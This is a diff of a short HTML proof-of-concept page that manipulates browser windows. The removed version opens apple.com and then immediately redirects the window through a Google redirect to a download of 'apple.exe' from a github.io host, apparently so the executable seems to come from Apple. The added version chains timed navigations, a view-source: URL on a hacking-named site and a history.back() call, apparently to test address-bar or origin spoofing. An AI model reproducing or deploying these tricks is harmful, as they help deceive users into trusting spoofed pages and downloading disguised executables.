@@ -1,11 +1,16 @@
+<button onclick="test()">clickme</button>
 <script>
-function a() {
-  let win = window.open('https://apple.com', '_blank');
-
-  // Immediate navigation, no setTimeout
-  win.location.href = 
-    'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe';
+function test()
+{
+  w = open('data:text/html,<h1>done</h1>')
+  setTimeout(function(){
+    w.location = 'http://www.google.cn'
+  }, 300)
+  setTimeout(function(){
+      w.location = 'view-source:http://infernohacks.com/t/test.php'
+      setTimeout(function(){
+        w.history.back()
+      }, 2100)
+  }, 2000)
 }
 </script>
-
-<input type="button" value="DOWNLOAD" onclick="a()">
